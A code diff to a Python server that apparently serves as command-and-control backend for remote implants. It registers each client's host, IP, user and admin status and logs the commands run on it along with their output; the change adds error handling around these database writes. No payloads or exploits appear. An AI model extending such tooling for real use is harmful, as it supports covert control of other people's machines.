@@ -73,38 +73,44 @@ def init_db():
 init_db()
 
 def db_save_client(info):
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
-            ON CONFLICT(client_id) DO UPDATE SET
-                pid=excluded.pid,
-                last_seen=excluded.last_seen,
-                status='ALIVE'
-        """, (
-            info['client_id'],
-            info.get('host', 'unknown'),
-            info.get('ip', 'unknown'),
-            info.get('pid', 0),
-            info.get('os', 'Unknown'),
-            info.get('user', 'unknown'),
-            1 if info.get('admin') else 0,
-            now,
-            now
-        ))
-        conn.commit()
+    try:
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
+                ON CONFLICT(client_id) DO UPDATE SET
+                    pid=excluded.pid,
+                    last_seen=excluded.last_seen,
+                    status='ALIVE'
+            """, (
+                info.get('client_id', 'unknown'),
+                info.get('host', 'unknown'),
+                info.get('ip', 'unknown'),
+                info.get('pid', 0),
+                info.get('os', 'Unknown'),
+                info.get('user', 'unknown'),
+                1 if info.get('admin') else 0,
+                now,
+                now
+            ))
+            conn.commit()
+    except Exception as e:
+        logging.error(f"Database save client error: {e}")
 
 def db_log_command(client_id, command, output):
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("""
-            INSERT INTO command_logs (client_id, command, output, timestamp)
-            VALUES (?, ?, ?, ?)
-        """, (client_id, command, output, now))
-        conn.commit()
+    try:
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with sqlite3.connect(DB_FILE) as conn:
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT INTO command_logs (client_id, command, output, timestamp)
+                VALUES (?, ?, ?, ?)
+            """, (client_id, command, output, now))
+            conn.commit()
+    except Exception as e:
+        logging.error(f"Database log command error: {e}")
 
 
 # ==================== CRYPTO HELPERS ====================
@@ -234,6 +240,7 @@ def register_route():
         if state.target_client is None:
             state.target_client = client_id
 
+        info['client_id'] = client_id
         db_save_client(info)
 
     admin_str = " [ADMIN]" if info.get('admin') else ""
